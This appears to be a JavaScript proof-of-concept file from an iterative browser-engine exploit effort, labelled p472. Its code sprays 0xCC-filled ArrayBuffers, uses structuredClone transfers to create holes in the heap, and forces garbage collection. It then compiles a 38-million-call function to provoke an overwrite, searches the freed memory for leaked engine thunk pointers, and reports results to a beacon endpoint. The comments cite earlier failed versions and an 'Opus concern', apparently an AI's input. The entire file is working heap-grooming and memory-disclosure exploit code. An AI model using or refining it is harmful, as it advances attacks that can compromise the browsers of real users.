// p472 — Diagnostic: Did the sweep touch ANY AB bytes?
//
// V471 failed with SPRAY-bufs0. Two hypotheses:
//   1. Sweep genuinely missed all ABs (metadata above spray)
//   2. Sweep DID hit ABs but scan missed due to alignment (only sampled ~10%)
//
// Fix: Fill ABs with 0xCC marker, full-byte-scan every surviving AB after compile.
// ANY byte != 0xCC means the sweep touched that AB.
//
// Also: NO TypedArray targets (Opus concern about groom interference).
//
// Beacon prefix: V472-
(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V472-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }
  function hx(b) { return (b < 16 ? '0' : '') + b.toString(16); }
  function hexN(view, off, n) {
    var s = '';
    for (var i = 0; i < n && off + i < view.byteLength; i++) s += hx(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  var BUF_SZ = 100112;
  var SPRAY_COUNT = 400;
  var MARKER = 0xCC;

  // Phase 1: Spray ABs filled with 0xCC marker
  var bufs = new Array(SPRAY_COUNT);
  var views = new Array(SPRAY_COUNT);
  for (var i = 0; i < SPRAY_COUNT; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
    views[i] = new Uint8Array(bufs[i]);
    for (var j = 0; j < BUF_SZ; j++) views[i][j] = MARKER;
  }
  B('SPRAY', SPRAY_COUNT + 'x' + BUF_SZ);

  // Phase 2: Transfer even-indexed via structuredClone → create holes
  var transferred = 0;
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      transferred++;
    } catch(e) {
      if (transferred === 0) { B('XFER-ERR', e.message.substring(0, 60)); break; }
    }
    views[i] = null;
    bufs[i] = null;
  }
  B('XFER', '' + transferred);

  // Phase 3: Build surviving view list
  var sViews = [];
  var sIdx = [];
  for (var i = 1; i < SPRAY_COUNT; i += 2) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      sViews.push(views[i]);
      sIdx.push(i);
    }
  }
  B('SURVIVORS', '' + sViews.length);

  // Phase 4: setTimeout + GC to free clones
  setTimeout(function() {
    for (var g = 0; g < 20; g++) {
      var junk = [];
      for (var j = 0; j < 50000; j++) junk.push({x: j});
      junk = null;
    }
    B('GC-DONE');

    // Phase 5: Compile 38M function
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);
    var parts = new Array(nC + 3);
    parts[0] = 'window.__p472fn=function(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '};window.__p472ok=1;';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED', window.__p472ok ? 'OK' : 'FAIL');
      doFullScan();
    };
    document.head.appendChild(sc);
    sc.src = url;
  }, 500);

  function doFullScan() {
    // Full byte scan: ANY byte != 0xCC means sweep touched this AB
    var dirtyCount = 0;
    var firstDirtyIdx = -1;
    var firstDirtyOff = -1;
    var firstDirtyVal = 0;
    var totalDirtyBytes = 0;

    for (var vi = 0; vi < sViews.length; vi++) {
      var v = sViews[vi];
      var dirty = false;
      for (var j = 0; j < v.byteLength; j++) {
        if (v[j] !== MARKER) {
          if (!dirty) {
            dirty = true;
            dirtyCount++;
            if (firstDirtyIdx < 0) {
              firstDirtyIdx = sIdx[vi];
              firstDirtyOff = j;
              firstDirtyVal = v[j];
            }
          }
          totalDirtyBytes++;
          if (totalDirtyBytes > 1000000) break;
        }
      }
      if (totalDirtyBytes > 1000000) break;
    }

    B('DIRTY-ABS', '' + dirtyCount + '-of-' + sViews.length);
    B('DIRTY-BYTES', '' + totalDirtyBytes);

    if (firstDirtyIdx >= 0) {
      B('FIRST-DIRTY', 'idx=' + firstDirtyIdx + ',off=' + firstDirtyOff + ',val=0x' + hx(firstDirtyVal));

      // Dump region around first dirty byte
      var v = sViews[0];
      for (var vi = 0; vi < sViews.length; vi++) {
        if (sIdx[vi] === firstDirtyIdx) { v = sViews[vi]; break; }
      }
      var dumpStart = Math.max(0, firstDirtyOff - 16);
      var dumpEnd = Math.min(v.byteLength, firstDirtyOff + 128);
      B('DUMP-FIRST', 'off=' + dumpStart + ':' + hexN(v, dumpStart, dumpEnd - dumpStart));

      // Find entry alignment in this dirty AB
      // Try all 112 bases, count non-0xCC bytes that match entry pattern
      var bestBase = -1, bestScore = 0;
      for (var tryBase = 0; tryBase < 112; tryBase++) {
        var score = 0;
        for (var off = tryBase; off + 112 <= v.byteLength; off += 112) {
          // Check if +12 has 0xFFFFFFFF OR +24 has non-CC
          if (off + 16 <= v.byteLength && u32(v, off + 12) === 0xFFFFFFFF) score += 10;
          if (off + 32 <= v.byteLength) {
            for (var b = off + 24; b < off + 32; b++) {
              if (v[b] !== MARKER && v[b] !== 0) score++;
            }
          }
          // Check bytecodeIndex at +68
          if (off + 72 <= v.byteLength) {
            var bci = u32(v, off + 68);
            if (bci > 0 && bci < 40000000 && bci !== 0xCCCCCCCC) score += 5;
          }
        }
        if (score > bestScore) { bestScore = score; bestBase = tryBase; }
      }
      B('BEST-ALIGN', 'base=' + bestBase + ',score=' + bestScore);

      if (bestBase >= 0 && bestScore >= 10) {
        // Extract thunk at bestBase+24
        var thunkOff = bestBase + 24;
        if (thunkOff + 8 <= v.byteLength) {
          B('THUNK', hexN(v, thunkOff, 8));
          // Read several entries
          for (var e = 0; e < 5 && bestBase + e * 112 + 32 <= v.byteLength; e++) {
            var eOff = bestBase + e * 112;
            B('ENTRY-' + e, 'slow=' + hexN(v, eOff + 12, 4) +
              ',thunk=' + hexN(v, eOff + 24, 8) +
              ',bci=' + hexN(v, eOff + 68, 4));
          }
        }
      }
    } else {
      B('ZERO-DIRTY', 'sweep missed all ' + sViews.length + ' ABs');

      // Diagnostic: verify markers are intact (not GC'd or detached)
      var intact = 0;
      for (var vi = 0; vi < Math.min(5, sViews.length); vi++) {
        var v = sViews[vi];
        var ok = true;
        for (var j = 0; j < 16; j++) {
          if (v[j] !== MARKER) { ok = false; break; }
        }
        if (ok) intact++;
      }
      B('MARKER-CHECK', intact + '-of-5-intact');
    }

    B('DONE');
  }
})();
